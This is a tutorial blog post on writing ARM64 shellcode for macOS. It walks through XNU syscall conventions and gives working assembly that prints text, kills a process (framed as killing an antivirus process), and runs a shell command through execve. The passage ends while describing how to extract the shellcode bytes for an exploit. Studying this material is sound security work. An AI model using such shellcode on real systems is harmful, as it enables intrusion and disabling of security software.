---
title: "macOS: Shellcoding on Apples (ARM64)"
classes: wide
header:
  teaser: /assets/images/ShellcodingOnApples.jpg

ribbon: blue
description: "Pt.2 macOS Shellcoding in depth on ARM64."
categories:
  - MacOS
tags:
  - MacOS
toc: true
---

# Introduction

Hello again, in our previous blogpost we explored shellcoding on `macOS` for the `x86_64` architecture. But since Apple has been shipping `Apple Silicon` (`M1`/`M2`/`M3`/`M4`) machines with `ARM64` (`AArch64`) as the first-class citizen — and `x86_64` on Apple hardware now runs only through the `Rosetta 2` translation layer — it only makes sense to cover shellcoding on the `native` architecture for modern `macOS` systems. Before diving in, you’ll need at least a basic understanding of `ARM64` assembly — this isn’t an assembly tutorial, so if you’re unfamiliar with the fundamentals, take some time to learn them first and return when you’re ready for the challenge. If you read our `x86_64` blogpost, You will find this one very familiar, Cause we will follow the same practical workflow: start by writing code in `C`, identify the necessary system calls, and then translate everything into assembly. This approach leverages the wealth of existing `C` documentation and resources, making the process significantly more manageable. You’ll find countless examples of how to build network clients, manipulate processes, or execute commands in `C`, but you’d be hard-pressed to find someone talking about implementing these same tasks purely in `ARM64` assembly. Let’s start with our Blogpost.

> You can find all the code on my github: https://github.com/Zeyad-Azima/macOShellcoding 

# Lab Setup

Let’s Setup our Lab and the required tools, Let’s list all the other tools we need.

- Homebrew

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

- Xcode:

```
We can download it from `AppStore`.
or: https://xcodereleases.com
```

- Xcode Command Line Tools (CLT)

```bash
xcode-select --install
```

That’s all we need this time. Cause as we will see, `nasm` is out and `clang` is in.

> Note: In our `x86_64` blogpost we used `nasm -f macho64` to assemble our code, But `nasm` doesn’t support the `ARM64` architecture at all. Instead, we will write our code in Apple’s `GNU`-style assembly syntax (`.s` files) and let `clang` do the assembling for us, Since `clang` is Apple’s native assembler front-end for `arm64`. Different dialect, same discipline.

Before we go on straight to shellcoding, We need to understand some FUNDAMENTALS first we would be using to be able to write our shellcodes. As we know the macos kernel (`XNU`) is a hybrid kernel which contains also `BSD`. We need to download the `XNU` source code. Cause we will use it for references in creating our shellcodes and understanding `syscalls` on `macOS`. We can download it from [here](https://opensource.apple.com/releases/).

Now, We need to download the source code version that matches the macOS you writing the shellcode for. I am on `macOS Sequoia` and the version is `macOS 15.2`. You can use `sw_vers` command to check it.

```
~ % sw_vers
ProductName:		macOS
ProductVersion:		15.2
BuildVersion:		24C101
```

![image](https://github.com/user-attachments/assets/7b194e38-5dbc-4f67-bd69-fa5b4510f214)

Now, Let’s download the `XNU` VERSION FOR it — same as last time, In our case we need `xnu-11215.61.5` which is the source version shipping with `macOS 15.2`.

![image](https://github.com/user-attachments/assets/b7798f9c-1077-4967-927d-0132ad2d3048)

# XNU Syscall Classes on ARM64

Now, Let’s open it with `VSCode` or your favorite `IDE/CodeEditor`.

![image](https://github.com/user-attachments/assets/4fb70323-3964-4270-9897-dcaf9c9aa4e9)

Last time on `x86_64` we went to `osfmk/mach/i386/syscall_sw.h`, So naturally we open `osfmk/mach/arm/syscall_sw.h` expecting the same class table... And it is **not there**. Surprise number one of the `ARM64` world: the `ARM64` file doesn’t carry the `SYSCALL_CLASS_*` defines at all — The class table lives **only** in the `i386` file (`osfmk/mach/i386/syscall_sw.h`), And even `libsyscall`’s own code points there (`/* see mach/i386/syscall_sw.h */`).

What the `ARM64` file *does* contain is even more interesting — the kernel-side trap macro that shows exactly how `macOS` receives our syscalls:

```C
#elif defined(__arm64__)

#include <mach/machine/vm_param.h>

#define kernel_trap(trap_name, trap_number, num_args) \
.globl _##trap_name                                           %% \
.text                                                         %% \
.align  2                                                     %% \
_##trap_name:                                                 %% \
    mov x16, #(trap_number)                                   %% \
    svc #SWI_SYSCALL                                          %% \
    ret
```

<img width="805" height="965" alt="image" src="https://github.com/user-attachments/assets/eced8ed7-2de7-424f-b528-b952418f1284" />


Read it with me, Cause this is the kernel telling us its own convention, Straight from the source: **the trap number goes in `X16`, And the syscall is issued with `svc #SWI_SYSCALL`.** This is the kernel-side proof of everything we did in the shellcodes below.

And where does `SWI_SYSCALL` come from? One more hop — `osfmk/mach/arm/vm_param.h`:

```C
#define SWI_SYSCALL     0x80
```

**`0x80`** — the canonical immediate we ring in every shellcode below, Straight from the source file. (On `Linux` `ARM64` you would use `svc #0` instead — Same instruction, different garden.)

So where is the class table? Back in the `i386` file — And the encoding convention carried over to `ARM64` through userland: the syscall *numbers* are still built as `(class << 24) | syscall`, Which is why our old friend `execve` (syscall number `59` or `0x3B` in hex) from the `SYSCALL_CLASS_UNIX` (class number `2`) is still passed as `0x200003B` when we make the syscall. The doors don’t move between floors just because the building was renovated — The kitchen just showed us its ticket scanner.

| Class | Name                 | Value | Shifted Base (`<< 24`) | Meaning          |
| ----- | -------------------- | ----- | ---------------------- | ---------------- |
| `0`   | `SYSCALL_CLASS_NONE` | `0`   | `0x00000000`           | Invalid          |
| `1`   | `SYSCALL_CLASS_MACH` | `1`   | `0x01000000`           | Mach traps       |
| `2`   | `SYSCALL_CLASS_UNIX` | `2`   | `0x02000000`           | **BSD syscalls** |
| `3`   | `SYSCALL_CLASS_MDEP` | `3`   | `0x03000000`           | Machine-dependent |
| `4`   | `SYSCALL_CLASS_DIAG` | `4`   | `0x04000000`           | Diagnostics      |
| `5`   | `SYSCALL_CLASS_IPC`  | `5`   | `0x05000000`           | Mach IPC (newer) |

> BSD = 0x02 « 24 = 0x02000000 → 0x2000000

Back to our `XNU` restaurant analogy from last time — you’re still dining in the same multi-level establishment, and the kitchen still routes your order based on the encoded ticket with the class shifted `24` bits left. The only thing that changed is *how* you summon the waiter: on `x86_64` you wave the `syscall` flag and show your ticket in `RAX`, while on `ARM64` you ring the `svc #0x80` bell and show the ticket in `X16`. Same ticket (`0x0200003B` for the `execve` tiramisu on the `BSD` floor), different bell. Bon appétit in the kernel!

> Note: On `ARM64`, the syscall number goes in the `X16` register instead of `RAX`, and the syscall is issued using the `svc` instruction (`Supervisor Call`) instead of `syscall`. On `macOS` the `svc` immediate operand is `0x80` (`svc #0x80`) — on `Linux` ARM64 you would use `svc #0` instead. Same instruction, different garden.

Here is a generic example of making a `write` syscall on `ARM64` macOS:

```asm
; Example assembly code for ARM64 macOS system call
mov x16, #SYS_write     ; Load the syscall number for 'write' into X16
mov x0, #1              ; File descriptor 1 (stdout)
mov x1, buffer          ; Pointer to buffer to write from
mov x2, #buffer_size    ; Number of bytes to write
svc #0x80               ; Issue the system call instruction
```

# ARM64 Calling Conventions and Registers

In the **ARM64 System** used by macOS (Apple Silicon), function arguments are passed via registers `X0` through `X7` in order: `X0` holds the 1st argument, `X1` the 2nd, `X2` the 3rd, and so on till `X7`. The return value is placed in `X0`, while `X8` is used as the indirect return value address for large structs. The syscall number itself goes in `X16` (the inter-procedural scratch register), `PC` points to the next instruction to execute, `SP` manages the stack (and must be **16-byte aligned** before any call), `X29` serves as the frame pointer, and `X30` is the link register which stores the return address. If a function requires more than eight arguments, additional arguments are passed on the stack.

## Calling Conventions Table

You can use this table as a reference.

| Register   | Usage                                             | Description |
|------------|---------------------------------------------------|-------------|
| `X0-X7`    | Function arguments and return values              | Used to pass and return data from functions |
| `X8`       | Indirect return value address                     | Often used for memory allocation routines |
| `X9-X15`   | Caller-saved temporary registers                  | Can be changed by the called function, must be saved by the caller if needed |
| `X16`      | Inter-procedural scratch register; syscall number | Used for passing system call numbers |
| `X17`      | Inter-procedural scratch register                 | Temporary register, similar to `X16` |
| `X18`      | Reserved on Apple platforms                       | Should not be used in user programs |
| `X19-X28`  | Callee-saved registers                            | Must be saved and restored by the called function if used |
| `X29`      | Frame pointer (FP)                                | Points to the base of the current stack frame |
| `X30`      | Link register (LR)                                | Stores the return address |
| `SP`       | Stack pointer                                     | Must be 16-byte aligned at function calls |
| `PC`       | Program counter                                   | Points to the next instruction to execute |
| `XZR`      | Zero register                                     | Always reads as zero and ignores writes |

The ARM64 architecture requires that the stack pointer (`SP`) is 16-byte aligned before making a function call, which is crucial for maintaining a reliable call stack and preventing alignment faults. When writing shellcode or functions in assembly, you need to preserve this alignment by adjusting the stack accordingly before function calls. And unlike `x86_64` where alignment issues sometimes forgave us, the `ARM64` Darwin kernel will happily throw alignment faults at you if you break this.

To illustrate how these registers are used in a syscall, In the Apple `.s` syntax we will use through this post:

```asm
; Assume x0, x1, and x2 are already set with appropriate values
mov x16, syscall_number     ; Syscall number goes in X16
; x0 = 1st argument
; x1 = 2nd argument
; x2 = 3rd argument
svc #0x80                   ; Execute syscall
```

# Shellcoding

Before writing our shellcode, To make it easy for ourselves instead of getting lost in all the assembly instructions, The best workflow to do is to write your code in `C`, then we convert it to assembly which will make it very easy for us, As there are references and resources for `C` it will make our process easier. For example, You would find people talking about how to make a client/server in `C` using `socket`. But, you won’t find someone("insane") talking about how to make a client/server in `ARM64` assembly. So The process would be as the following:

- Find `C` functions that we will need in our code.
- Write our code in `C`.
- Turn our code into assembly.
    - Which including getting our syscall numbers ready.
    - Function arguments and types.

Let’s go ahead and start with something simple to make things clear.

## Print ‘Hello’

We will start by printing `Hello` into the screen. So let’s apply our workflow. Usually when we want to print something in `C`, we use `printf()` function as the following:

```C
#include <stdio.h>

int main() {
    printf("Hello");
    return 0;
}
```

Now, As we identified the functions we need which is `printf()`, And we wrote our code the 3rd step is to turn it into assembly. So the first thing we would need is to get the syscall number for `printf()`, We can find all the `syscalls` in `bsd/kern/syscalls.master`. From our `x86_64` blogpost investigation we already know that `printf()` is not in there, and after chasing the implementation we end up at the same conclusion: `printf()` goes through `vfprintf` and friends until we reach the `write` syscall.

### Call Chain: `printf` → `write` Syscall

| Step | Function Name |
|------|-----------------|
| 1 | `printf` |
| 2 | `vfprintf` |
| 3 | `__vfprintf_internal` |
| 4 | `Xprintf_buffer_write` |
| 5 | `_IO_new_file_overflow` |
| 6 | `_IO_do_write` |
| 7 | `new_do_write` |
| 8 | `_IO_SYSWRITE` |
| 9 | `__swrite` *(macOS only)* |
| 10 | `write` *(syscall)* |

You can find the source code files here (same links as last time):

- [printf.c](https://codebrowser.dev/glibc/glibc/stdio-common/printf.c.html)
- [vfprintf.c](https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf.c.html)
- [vfprintf-internal.c](https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf-internal.c.html)
- [printf_buffer.h](https://codebrowser.dev/glibc/glibc/stdio-common/printf_buffer.h.html)
- [fileops.c](https://codebrowser.dev/glibc/glibc/libio/fileops.c.html)
- [libioP.h](https://codebrowser.dev/glibc/glibc/libio/libioP.h)

Also you could just have asked `ChatGPT` or something xD, But keep in mind with complicated shellcodes you would want to go through codes and else cause you always will learn something and upgrade yourself.

Now, When we search for `write` syscall we can see it in the `syscalls.master` file:

![image](https://github.com/user-attachments/assets/9aab6429-2fa8-454d-a3e4-aa023b96b10d)

And as before, the `write` syscall number is `4`, it takes 3 arguments. We need to learn about these arguments and how to use them, Which simply can be done by searching it or going to the documentation:

![image](https://github.com/user-attachments/assets/f8bd5305-0d23-4b50-a837-df58881c10b1)

So from the description we can know that we need to supply the string pointer to `buf` the second argument and number of bytes (`length`) to the third argument `nbyte`, And for the `fd` (File Descriptor), When we search it we will see that it takes the following values:

- `0 (STDIN_FILENO)`: Represents standard input, typically connected to the keyboard or the input of a pipe.
- `1 (STDOUT_FILENO)`: Represents standard output, typically connected to the display or the output of a pipe.
- `2 (STDERR_FILENO)`: Represents standard error, typically connected to the display for error messages.

Our goal here is `STDOUT` which is value `1`. So our syscall will be as the following:

```
int main() {
    const char *message = "Hello";
    write(1, message, 5);
}
```

Now let’s write our shellcode. First, a small but important difference from `x86_64` we need to deal with: on `x86_64` we could do `mov rcx, 'Hello'` and `push rcx` to plant a string on the stack in 2 instructions — But `ARM64` instructions are fixed-size (4 bytes each), and `mov` can only encode up to 16 bits directly. So we build our 64-bit value piece by piece using `movz`/`movk` (`Move Zero` / `Move Keep`, each handling one 16-bit chunk). Then we store it to the stack. So our shellcode:

```asm
.global _main
.align 2

_main:
	sub sp, sp, #16         ; make room on the stack for our string (16 keeps SP 16-byte aligned)
	movz x9, #0x6548        ; build our string: 'H','e' chunk -> x9 = 0x0000000000006548
	movk x9, #0x6c6c, lsl #16 ; 'l','l' chunk -> x9 = 0x000000006c6c6548
	movk x9, #0x006f, lsl #32 ; 'o' chunk + terminator zeros -> x9 = 0x0000006f6c6c6548 ('Hello\0\0\0')
	stur x9, [sp]           ; store the string bytes onto the stack
	mov x1, sp              ; buf argument -> X1: pointer to our string
	mov x2, #5              ; nbytes argument -> X2: our string length
	mov x0, #1              ; fd argument -> X0: stdout
	movz x16, #4            ; write syscall number (4)
	movk x16, #0x200, lsl #16 ; OR with the BSD syscall class 2 -> X16 = 0x2000004
	svc #0x80               ; invoke/execute the syscall
```

Here our shellcode, starting with `.global _main` to export the `Mach-O` entry point and `.align 2` to keep instructions 4-byte aligned — the `ARM64` replacement of `bits 64` + `global _main` from `nasm`. The `sub sp, sp, #16` makes room on the stack for our string while keeping `SP` 16-byte aligned (our new non-negotiable rule). Next, We build the string `'Hello'` chunk by chunk into `X9`: `movz x9, #0x6548` loads the first 16 bits (`'H'`,`'e'` little-endian), `movk x9, #0x6c6c, lsl #16` keeps loading `'l'`,`'l'` into the next chunk, And `movk x9, #0x006f, lsl #32` loads `'o'` plus a zero chunk which doubles as our `NULL` terminator — Padding the remaining bytes with zeros `0x00` exactly like our `push rcx` did on `x86_64`. The `stur x9, [sp]` (`Store Register unscaled`) then writes all 8 bytes to the stack, And `mov x1, sp` supplies the pointer to our string for the `buf` argument. The `mov x2, #5` sets the number of bytes to write matching the length of `Hello`, And `mov x0, #1` selects `stdout` for the `fd` argument. Finally the `movz x16, #4` + `movk x16, #0x200, lsl #16` pair loads our `XNU` encoded syscall number — On `x86_64` we could `mov rax, 0x2000004` in one shot, But since `ARM64` chunks are 16 bits each we split it: the low 16 bits hold `4` (`write`) and `0x200` placed at bits `16-31` via `lsl #16` combines into exactly `0x2000004` = `(SYSCALL_CLASS_UNIX << 24) | 4`. The `svc #0x80` instruction triggers the kernel trap, dispatching through `XNU`’s handler to execute `write(1, "Hello", 5)`.

> Note: Be careful with your `movk` chunks — each 16-bit value is a little-endian *pair* of characters. `'l','l'` is `0x6c6c`, NOT `0x6c6f`. During testing, One wrong chunk had our shellcode happily printing `Heloo` instead of `Hello`, And it still "worked" — 5 bytes came out, Just the wrong ones. The kernel doesn’t read your strings, It just counts bytes. Always verify your output!

Let’s save our code into file `hello.s` and compile our code.

- First, Assemble to object file using `clang` with `arm64` arch (the replacement of `nasm -f macho64`):

```
shellcoding % clang -arch arm64 -c hello.s
shellcoding % ls
hello.s		hello.o
```

We got our object file `hello.o`.

- Second, We will link the required libraries needed for the code to generate the executable using `ld` (same flags as our `x86_64` post, Just with the `MacOSX15.2` SDK):

```
shellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.2.sdk/usr/lib -lSystem -platform_version macos 15.2 15.2
shellcoding % ls
hello		hello.s		hello.o
```

Here we can see after linking we got our executable.

> Note: Remember the `ld: warning: no platform load command found in 'hello.o'` warning from the `x86_64` post? With `clang` doing the assembling you typically won’t see it here, Cause `clang` embeds the platform load command in the object for us. One less thing to worry about.

- Let’s run and test our executable:

```
shellcoding % ./hello 
Hellozsh: illegal hardware instruction  ./hello
shellcoding % 
```

A new friend this time — on `x86_64` our exit-less shellcode died with a `segmentation fault`, But on `ARM64` we get `illegal hardware instruction` (`SIGILL`, exit code `132`). And the reason is the same as before, Just wearing different clothes: the program doesn’t `return` (exit) after our `write` syscall, So the CPU keeps executing whatever comes after our code — And on `ARM64` the zero padding bytes after our shellcode decode as `udf #0` (`Permanently Undefined` instruction), An instruction that is *guaranteed* to trap, So the kernel kills the process with `SIGILL` instead of walking into invalid memory like `x86_64` did. Either way: Like we learned before, `return 0;` in a `C` main becomes the `exit` syscall, Which terminates the entire process and returns the specified exit status to the OS. So, We need to exit after executing our `write` syscall.

## Exit

We can exit using `exit` syscall, As we can see it in the `syscalls.master` file — the same line we saw last time, Since it’s the same `BSD` side of the fence:

```
1	AUE_EXIT	ALL	{ void exit(int rval) NO_SYSCALL_STUB; }
```

The syscall number is `1` and it takes only 1 integer argument `rval` which is the value to return — `0` for `EXIT_SUCCESS` or something else for `EXIT_FAILURE`. Let’s update our shellcode and add `exit` syscall:

```asm
.global _main
.align 2

_main:
	sub sp, sp, #16         ; make room on the stack for our string
	movz x9, #0x6548        ; build our string: 'H','e' chunk
	movk x9, #0x6c6c, lsl #16 ; 'l','l' chunk
	movk x9, #0x006f, lsl #32 ; 'o' chunk + terminator zeros
	stur x9, [sp]           ; store our string on the stack
	mov x1, sp              ; buf argument -> pointer to our string
	mov x2, #5              ; nbytes argument (string length)
	mov x0, #1              ; fd argument (stdout)
	movz x16, #4            ; write syscall number
	movk x16, #0x200, lsl #16 ; OR with the BSD syscall class 2 -> X16 = 0x2000004
	svc #0x80               ; invoke/execute the syscall

	movz x16, #1            ; exit syscall number
	movk x16, #0x200, lsl #16 ; OR with the BSD syscall class 2 -> X16 = 0x2000001
	mov x0, #0              ; arg int rval
	svc #0x80               ; invoke/execute the syscall
```

Notice even the `exit` number `1` needs its class chunk: `X16` must carry `0x2000001`, Not just `1` — Remember, never shout just "1" in the `XNU` restaurant, the kitchen needs the full encoded ticket with the floor number.

Now, let’s repeat the process of compiling to get our executable again and test it.

```
shellcoding % clang -arch arm64 -c hello.s
shellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.2.sdk/usr/lib -lSystem -platform_version macos 15.2 15.2
shellcoding % ./hello 
Hello%                                                           
shellcoding % 
```

As we see clearly our code worked perfectly this time.

## Kill a Process

Let’s do another shellcode, And take the same scenario as last time: we found a way to execute code with high privileges and We need to write a shellcode to kill the `AV` process. The `C` code to kill a process is as the following:

```C
#include <stdio.h>
#include <signal.h>
#include <sys/types.h> // For pid_t
#include <unistd.h>    // For getpid() (optional, for self-killing example)

int main() {
    pid_t target_pid;

    target_pid = 12345; 

    // Sending SIGTERM (graceful termination)
    kill(target_pid, SIGTERM);

    return 0;
}
```

We can see here we used `kill` function and supply the `PID` and the signal which is `SIGTERM`.

Now, If we search for `kill` in `syscalls.master`. We can find it:

```C
37	AUE_KILL	ALL	{ int kill(int pid, int signum, int posix) NO_SYSCALL_STUB; }
```

Same as last time, the syscall number is `37` (`0x25`), And from the `XNU` source at `bsd/sys/signal.h:103` we know:

```C
#define SIGKILL 9       /* kill (cannot be caught or ignored) */
#define SIGBUS  10      /* bus error */
#define SIGSEGV 11      /* segmentation violation */
#define SIGSYS  12      /* bad argument to system call */
#define SIGPIPE 13      /* write on a pipe with no one to read it */
#define SIGALRM 14      /* alarm clock */
#define SIGTERM 15      /* software termination signal from kill */
#define SIGURG  16      /* urgent condition on IO channel */
#define SIGSTOP 17      /* sendable stop signal not from tty */
```

So `SIGTERM` is `15` and `SIGKILL` is `9` — and again we prefer `SIGKILL` as it will be forced and kill (cannot be caught or ignored). Also, as we learned from `bsd/kern/kern_sig.c:1373` last time, the third argument `int posix`:

| Value             | Meaning                             |
|-------------------|-------------------------------------|
| `posix = 0`       | Mach (legacy) signal behavior       |
| `posix = 1` (or any `!0`) | POSIX/BSD signal behavior    |

We will go with `1` to get the same behaviour as the `kill()` we call in `C`.

> Note: usually when you see extra arguments that was not mentioned or supplyed in the `C` code, It means that the argument is optional and not really required so you always can supply `0` or `NULL` as a value to the optional/non-required arguments.

Let’s spawn a test process and get its `PID` to supply as the first argument — same infinity loop running in background:

```
shellcoding % while true; do sleep 10; done &
[1] 36743
shellcoding % ps -p 36743
  PID TTY           TIME CMD
36743 ttys001    0:00.01 -zsh
```

the `PID` is `36743`. Converting it to hex: `36743 = 0x8F87`. (Your `PID` will be different every run — just convert yours the same way.)

Now, Lets write our shellcode:

```asm
.global _main
.align 2

_main:
	movz x0, #0x8f87        ; 1st argument -> our PID 36743 (0x8F87 in hex)
	                        ; note: `movz` zero-fills the whole 64-bit destination, so upper bits are NULL
	mov x1, #9              ; 2nd argument -> signum, our SIGKILL value
	mov x2, #1              ; 3rd argument -> posix behavior, `!0` for POSIX/BSD
	movz x16, #0x25         ; the kill syscall number 37 (0x25 in hex)
	movk x16, #0x200, lsl #16 ; OR with the BSD syscall class 2
	svc #0x80               ; invoke/execute the syscall

	movz x16, #1            ; exit syscall number
	movk x16, #0x200, lsl #16 ; OR with the BSD syscall class 2
	mov x0, #0              ; arg int rval
	svc #0x80               ; invoke/execute the syscall
```

Here our shellcode, We pass our arguments as the following: `PID` for `X0`, then `signum` for `X1` and after that, `posix` to `X2`, And we setup `X16` with the BSD-encoded syscall ticket `0x2000025` — same style as the `kill` shellcode from `x86_64`, Just wearing ARM clothes. Finally, We exit gracefully using `exit` syscall.

```
shellcoding % clang -arch arm64 -c killer.s
shellcoding % ld -o killer killer.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.2.sdk/usr/lib -lSystem -platform_version macos 15.2 15.2
shellcoding % ./killer
shellcoding % 
[1]  + killed     while true; do; sleep 10; done
shellcoding % ps -p 36743
  PID TTY           TIME CMD
```

As we can see clearly, The process has been killed successfully.

## Execute Command

Now, The exciting parts where we need to execute commands. Let’s bring our `C` code to execute commands on the system, Same as before:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int main() {
    pid_t pid;
    char *const argv[] = {"/bin/sh", "-c", NULL}; // Command and its arguments
    char *const envp[] = {NULL}; // Environment variables (can be customized)

    execve(argv[0], argv, envp);
   

    return 0;
}
```

As we can see here it uses `execve()` function. And from our earlier post, We already know the syscall in `syscalls.master`:

```C
59	AUE_EXECVE	ALL	{ int execve(char *fname, char **argp, char **envp) NO_SYSCALL_STUB; }
```

So it takes a pointer to the `fname` which is the file name, then pointer to array `argp` and pointer to another array `envp`.

![image](https://github.com/user-attachments/assets/d03ca643-261d-4918-b1d0-271519f8471e)

We can see that in the description of `execve()`, the first argument is the path to the binary we want to execute which is gonna be the shell in this case. Then for the second argument it takes array the arguments of the executable or program we passing and the first element in the array has to be the same file name. So the array will be as the following, if we want to execute `echo "W00tW00t" > /tmp/Pwned.txt` command `{"/bin/sh","-c","echo \"W00tW00t\" > /tmp/Pwned.txt", NULL}` — and pay attention to that last `NULL`: the `argv` array must be **NULL-terminated**, Something the `C` compiler does for us silently in the code above, But we have to do it ourselves in assembly. The third argument `envp` as mentioned is optional so we can supply `NULL`.

Let’s go on and write our shellcode. Two problems first, Both `ARM64`-flavored:

- Our `/bin/zsh` string is exactly 8 characters long, Which fills all 8 bytes with no room for a `NULL` terminator — So we will use `/bin/sh` (7 chars + terminator = exactly 8 bytes). Same trick, one character shorter.
- On `x86_64` we used the classic `call array / db '...'` duo to place the long command string — But `ARM64` has something even more elegant: the `adr` instruction (`Address of`), Which loads a `PC`-relative address of any label near our code (within `±1MB`). No calling trick needed, The assembler does the address math for us.

```asm
.global _main
.align 2

_main:
	sub sp, sp, #48         ; make space on the stack: 2 string slots + 4 array slots (48 keeps SP 16-byte aligned)
	movz x9, #0x622f        ; build "/bin/sh\0" chunk by chunk: '/b'
	movk x9, #0x6e69, lsl #16 ; 'i','n' -> "/bin"
	movk x9, #0x732f, lsl #32 ; '/','s' -> "/bin/s"
	movk x9, #0x0068, lsl #48 ; 'h' + terminator -> "/bin/sh\0"
	stur x9, [sp]           ; store the "/bin/sh\0" string at [sp]
	movz x10, #0x632d       ; build "-c\0": '-','c' chunk, upper zeros = terminator
	stur x10, [sp, #8]      ; store the "-c\0" string at [sp, #8]
	adr x11, cmd            ; classic position-independent trick: load the PC-relative address of our command string
	mov x3, sp              ; x3 = ADDRESS of the "/bin/sh\0" string
	add x4, sp, #8          ; x4 = ADDRESS of the "-c\0" string
	str x3, [sp, #16]       ; argv[0] -> pointer to "/bin/sh\0"
	str x4, [sp, #24]       ; argv[1] -> pointer to "-c\0"
	str x11, [sp, #32]      ; argv[2] -> pointer to our command string
	str xzr, [sp, #40]      ; argv[3] -> NULL terminator (the array must end with NULL)
	mov x0, sp              ; fname argument -> pointer to "/bin/sh\0"
	add x1, sp, #16         ; argp argument -> pointer to our argv array
	mov x2, xzr             ; envp argument -> NULL (XZR always reads as zero)
	movz x16, #0x3b         ; the execve syscall number 59 (0x3B in hex)
	movk x16, #0x200, lsl #16 ; OR with the BSD syscall class 2
	svc #0x80               ; invoke/execute the syscall

	movz x16, #1            ; exit syscall number
	movk x16, #0x200, lsl #16 ; OR with the BSD syscall class 2
	mov x0, #0              ; arg int rval
	svc #0x80               ; invoke/execute the syscall

cmd:
	.string "echo \"W00tW00t\" > /tmp/Pwned.txt"
```

Here our shellcode, first we `sub sp, sp, #48` — 48 is divisible by 16, So our `SP` alignment rule holds even after the decrement. Then we build the `/bin/sh\0` string chunk by chunk into `X9` using `movz`/`movk` (each 16-bit chunk is the little-endian pair of characters) and `-c\0` into `X10`, And we `stur` (`Store Register unscaled`, which allows any stack offset) them into the first two stack slots. The `adr x11, cmd` is the `ARM64` equivalent of the classic `x86_64` position-independent trick — Since the command string `"echo \"W00tW00t\" > /tmp/Pwned.txt"` is too long to build with registers, We `.string` it after our shellcode at the `cmd:` label and `adr` loads its `PC`-relative address into `X11`, So the command string’s runtime address is available no matter where the shellcode gets injected — Just like the `call array / db '...'` duo, But cleaner.

Now pay attention to the next part, Cause this is where `ARM64` slapped me personally during testing: `mov x3, sp` and `add x4, sp, #8` compute the **addresses** of our two strings, And only those addresses go into the `argv` array. The trap is writing `str x9, [sp, #16]` instead — storing the *string bytes* `0x0068732f6e69622f` as `argv[0]` instead of a pointer to the string. It assembles fine, It runs fine, And `execve` fails with `EFAULT` (error `14`, bad address) while your shellcode gracefully exits like nothing happened. Remember: on `x86_64` the original shellcode did `mov rdi, rsp` — copying the *stack pointer* to get the string address, Not the string value. Same lesson, New architecture: **the kernel wants pointers, Not your data**.

After the pointers, `str xzr, [sp, #40]` places the `NULL` terminator as `argv[3]` — the silent end-of-array marker that `C` adds for you and assembly won’t. Without it, `execve` reads whatever garbage sits at `sp+40` as a fourth argument pointer and fails. Then we set the `execve` arguments: `X0 = sp` points to the string for the `fname` argument, `X1 = sp + 16` points to our `argp` array, And `X2 = xzr` for `envp` which is `NULL`. Then the `movz`/`movk` pair sets `X16 = 0x200003B` for our execve syscall, And `svc #0x80` invokes the kernel to execute `execve(filename, argv, envp)`. If `execve` returns (i.e., it failed) the code falls through to the `exit` syscall to terminate the process.

> Note: `0x3B` = 59 decimal → `execve`

> Note: `mov x2, xzr` is our new best friend — `XZR` (the zero register) always reads as `0` and ignores writes, So `mov x2, xzr` is the `ARM64` way of writing `xor rdx, rdx` from `x86_64`. Zero on demand, No instruction spent on computing it. And `envp = NULL` works fine on `macOS` — verified.

```
shellcoding % clang -arch arm64 -c execute.s
shellcoding % ld -o execute execute.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.2.sdk/usr/lib -lSystem -platform_version macos 15.2 15.2
shellcoding % ls /tmp | grep -i pwned
shellcoding % ./execute
shellcoding % ls -la /tmp/Pwned.txt
-rw-r--r--  1 labatrixteam  wheel  9 Sep 17 00:30 /tmp/Pwned.txt
shellcoding % cat /tmp/Pwned.txt 
W00tW00t
```

We can see clearly, That our shellcode is executed successfully and our file created.

# Extract Shellcode

Now, Let’s extract our shellcode from the object file, So if we need to send it with our exploit. We will use `objdump` and `otool` to view it, And — spoiler — `segedit` to actually extract it. You will see why in a moment.

## objdump

Careful here — the `--x86-asm-syntax=intel` flag which we used on `x86_64` makes no sense for `ARM64`, Since `objdump` will happily print `ARM64` assembly by itself. Here is our real disassembly:

```
shellcoding % objdump --disassemble ~/shellcoding/execute.o

execute.o:	file format mach-o arm64

Disassembly of section __TEXT,__text:

0000000000000000 <ltmp0>:
       0: d100c3ff     	sub	sp, sp, #0x30
       4: d28c45e9     	mov	x9, #0x622f             ; =25135
       8: f2adcd29     	movk	x9, #0x6e69, lsl #16
       c: f2ce65e9     	movk	x9, #0x732f, lsl #32
      10: f2e00d09     	movk	x9, #0x68, lsl #48
      14: f80003e9     	stur	x9, [sp]
      18: d28c65aa     	mov	x10, #0x632d            ; =25389
      1c: f80083ea     	stur	x10, [sp, #0x8]
      20: 1000022b     	adr	x11, 0x64 <cmd>
      24: 910003e3     	mov	x3, sp
      28: 910023e4     	add	x4, sp, #0x8
      2c: f9000be3     	str	x3, [sp, #0x10]
      30: f9000fe4     	str	x4, [sp, #0x18]
      34: f90013eb     	str	x11, [sp, #0x20]
      38: f90017ff     	str	xzr, [sp, #0x28]
      3c: 910003e0     	mov	x0, sp
      40: 910043e1     	add	x1, sp, #0x10
      44: aa1f03e2     	mov	x2, xzr
      48: d2800770     	mov	x16, #0x3b              ; =59
      4c: f2a04010     	movk	x16, #0x200, lsl #16
      50: d4001001     	svc	#0x80
      54: d2800030     	mov	x16, #0x1               ; =1
      58: f2a04010     	movk	x16, #0x200, lsl #16
      5c: d2800000     	mov	x0, #0x0                ; =0
      60: d4001001     	svc	#0x80

0000000000000064 <cmd>:
      64: 6f686365     	umlml2.4s	v5, v27, v8[2]
      68: 30572220     	adr	x0, 0xae4ad <cmd+0xae449>
      6c: 30577430     	adr	x16, 0xaeef1 <cmd+0xaee8d>
      70: 20227430     	<unknown>
      74: 742f203e     	cbge	w30, w15, 0xfffffffffffffc6c <cmd+0xfffffffffffffc14>
      78: 502f706d     	adr	x13, 0x5ee86 <cmd+0x5ee22>
      7c: 64656e77     	<unknown>
      80: 7478742e     	<unknown>
      84: 00           	<unknown>
```

A few things to notice here:

